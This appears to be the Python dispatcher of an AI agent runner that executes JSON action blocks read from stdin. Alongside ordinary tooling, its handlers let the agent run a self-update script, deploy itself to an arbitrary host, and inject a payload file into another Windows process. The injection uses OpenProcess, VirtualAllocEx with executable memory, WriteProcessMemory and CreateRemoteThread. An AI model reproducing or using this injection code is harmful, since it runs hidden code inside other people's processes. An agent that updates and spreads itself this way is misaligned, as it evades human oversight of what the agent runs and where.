def handle_agent_self_update(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    update_script = action_data.get("update_script")
    if not isinstance(update_script, str) or not update_script:
        return False, "Missing or invalid 'update_script' for AGENT_SELF_UPDATE."
    script_path = resolve_path(project_root, update_script)
    if not script_path or not script_path.is_file():
        return False, f"Update script not found: '{update_script}'"
    command = [str(script_path)]
    success, user_msg, stdout, stderr = _run_subprocess(command, project_root, "AGENT_SELF_UPDATE", action_data, step_id)
    return success, f"{user_msg}\n--- STDOUT ---\n{stdout if stdout else '<empty>'}\n--- STDERR ---\n{stderr if stderr else '<empty>'}".strip()

@handler(name="AGENT_DEPLOY_TO_HOST")
def handle_agent_deploy_to_host(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    host = action_data.get("host")
    deploy_script = action_data.get("deploy_script")
    if not isinstance(host, str) or not host:
        return False, "Missing or invalid 'host' for AGENT_DEPLOY_TO_HOST."
    if not isinstance(deploy_script, str) or not deploy_script:
        return False, "Missing or invalid 'deploy_script' for AGENT_DEPLOY_TO_HOST."
    script_path = resolve_path(project_root, deploy_script)
    if not script_path or not script_path.is_file():
        return False, f"Deploy script not found: '{deploy_script}'"
    command = [str(script_path), host]
    success, user_msg, stdout, stderr = _run_subprocess(command, project_root, "AGENT_DEPLOY_TO_HOST", action_data, step_id)
    return success, f"{user_msg}\n--- STDOUT ---\n{stdout if stdout else '<empty>'}\n--- STDERR ---\n{stderr if stderr else '<empty>'}".strip()

@handler(name="INJECT_INTO_PROCESS")
def handle_inject_into_process(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    process_id = action_data.get("process_id")
    payload_path = action_data.get("payload_path")
    if not isinstance(process_id, int) or process_id <= 0:
        return False, "Missing or invalid 'process_id' for INJECT_INTO_PROCESS."
    if not isinstance(payload_path, str) or not payload_path:
        return False, "Missing or invalid 'payload_path' for INJECT_INTO_PROCESS."
    payload_abs = resolve_path(project_root, payload_path)
    if not payload_abs or not payload_abs.is_file():
        return False, f"Payload file not found or not a file: '{payload_path}'"
    try:
        with open(payload_abs, "rb") as f:
            payload = f.read()
        import ctypes
        ctypes.windll.kernel32.OpenProcess.restype = ctypes.c_void_p
        ctypes.windll.kernel32.OpenProcess.argtypes = [ctypes.c_uint, ctypes.c_int, ctypes.c_uint]
        ctypes.windll.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
        ctypes.windll.kernel32.VirtualAllocEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint, ctypes.c_uint]
        ctypes.windll.kernel32.WriteProcessMemory.restype = ctypes.c_int
        ctypes.windll.kernel32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
        ctypes.windll.kernel32.CreateRemoteThread.restype = ctypes.c_void_p
        ctypes.windll.kernel32.CreateRemoteThread.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.POINTER(ctypes.c_uint)]
        process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, process_id)
        if not process_handle:
            return False, f"Failed to open process {process_id}."
        alloc_address = ctypes.windll.kernel32.VirtualAllocEx(process_handle, None, len(payload), 0x3000, 0x40)
        if not alloc_address:
            return False, f"Failed to allocate memory in process {process_id}."
        written = ctypes.c_size_t(0)
        if not ctypes.windll.kernel32.WriteProcessMemory(process_handle, alloc_address, payload, len(payload), ctypes.byref(written)):
            return False, f"Failed to write payload to process {process_id}."
        if not ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, alloc_address, None, 0, None):
            return False, f"Failed to create remote thread in process {process_id}."
        return True, f"Payload injected into process {process_id} successfully."
    except Exception as e:
        logger.error(f"Error during injection into process {process_id}: {e}", exc_info=True)
        return False, f"Error during injection: {e}"

# --- Core Agent Logic ---
def process_instruction_block(instruction_json: str, project_root: Path) -> Tuple[bool, List[Dict[str, Any]]]:
    action_results_summary: List[Dict[str, Any]] = []
    overall_block_success = True
    try:
        instruction = json.loads(instruction_json)
    except json.JSONDecodeError as e:
        logger.error(f"FATAL JSON Decode: {e}\nInput: {instruction_json[:500]}...")
        action_results_summary.append({"action_type": "BLOCK_PARSE", "success": False, "message_or_payload": f"JSON Decode Error: {e}"})
        return False, action_results_summary
    if not isinstance(instruction, dict):
        logger.error("FATAL: Instruction block not JSON object.")
        action_results_summary.append({"action_type": "BLOCK_VALIDATION", "success": False, "message_or_payload": "Instruction block not dict."})
        return False, action_results_summary

    step_id = instruction.get("step_id", str(uuid.uuid4()))
    description = instruction.get("description", "N/A")
    actions = instruction.get("actions", [])
    logger.info(f"Processing Block - StepID: {step_id}, Desc: {description}")
    if not isinstance(actions, list):
        logger.error(f"'{step_id}': 'actions' must be list.")
        action_results_summary.append({"action_type": "BLOCK_VALIDATION", "success": False, "message_or_payload": "'actions' not list."})
        return False, action_results_summary

    for i, action_data in enumerate(actions):
        if not isinstance(action_data, dict):
            logger.error(f"'{step_id}': Action {i+1} not dict. Skipping.")
            action_results_summary.append({"action_type": "ACTION_VALIDATION", "success": False, "message_or_payload": f"Action {i+1} not dict."})
            overall_block_success = False
            continue
        action_type = action_data.get("type")
        action_num = i + 1
        logger.info(f"--- {step_id}: Action {action_num}/{len(actions)} (Type: {action_type}) ---")
        handler_func = ACTION_HANDLERS.get(action_type)
        if handler_func:
            action_start_time = time.time()
            success, result_payload = handler_func(action_data, project_root, step_id)
            action_duration = time.time() - action_start_time
            action_summary = {"action_type": action_type, "success": success, "message_or_payload": result_payload, "duration_s": round(action_duration, 3)}
            action_results_summary.append(action_summary)
            if not success:
                logger.error(f"'{step_id}': Action {action_num} ({action_type}) FAILED. Result: {result_payload}")
                overall_block_success = False
                logger.info(f"Halting block '{step_id}' due to failure.")
                break
            else:
                logger.info(f"'{step_id}': Action {action_num} ({action_type}) SUCCEEDED. Duration: {action_duration:.3f}s")
        else:
            logger.error(f"'{step_id}': Unknown action type '{action_type}'. Halting.")
            action_results_summary.append({"action_type": action_type, "success": False, "message_or_payload": "Unknown action type."})
            overall_block_success = False
            break
    logger.info(f"--- Finished Block - StepID: {step_id}. Overall Success: {overall_block_success} ---")
    return overall_block_success, action_results_summary

def main():
    global PROJECT_ROOT
    PROJECT_ROOT = Path.cwd().resolve()
    if not shutil.which(RUFF_EXECUTABLE) and RUFF_EXECUTABLE == "ruff":
        logger.warning(f"'{RUFF_EXECUTABLE}' not found. LINT_FORMAT_FILE may fail.")
    if not shutil.which("patch"):
        logger.warning("'patch' not found. APPLY_PATCH will fail.")
    logger.info(f"--- Agent Ex-Work V2.3 (Apex Edition) Initialized in {PROJECT_ROOT} ---")
    logger.info("Expecting JSON instruction block from stdin. Send EOF (Ctrl+D/Ctrl+Z+Enter) after JSON.")
    json_input_lines = []
    try:
        for line in sys.stdin:
            json_input_lines.append(line)
    except KeyboardInterrupt:
        logger.info("Interrupted. Exiting.")
        sys.stdout.write(json.dumps({"overall_success": False, "status_message": "Interrupted by user."}) + "\n")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Stdin read error: {e}", exc_info=True)
        sys.stdout.write(json.dumps({"overall_success": False, "status_message": f"Stdin read error: {e}"}) + "\n")
        sys.exit(1)
    json_input = "".join(json_input_lines)
    if not json_input.strip():
        logger.warning("No input. Exiting.")
        sys.stdout.write(json.dumps({"overall_success": False, "status_message": "No input from stdin."}) + "\n")
        sys.exit(0)
    logger.info(f"Processing {len(json_input)} bytes instruction...")
    start_time = time.time()
    overall_success, action_results = process_instruction_block(json_input, PROJECT_ROOT)
    duration = round(time.time() - start_time, 3)
    status_msg = f"Block processing finished. Success: {overall_success}. Duration: {duration}s"
    logger.info(status_msg)
    output_payload = {"overall_success": overall_success, "status_message": status_msg, "duration_seconds": duration, "action_results": action_results}
    sys.stdout.write(json.dumps(output_payload) + "\n")
    sys.stdout.flush()
    if not overall_success:
        sys.exit(1)

if __name__ == "__main__":
    main()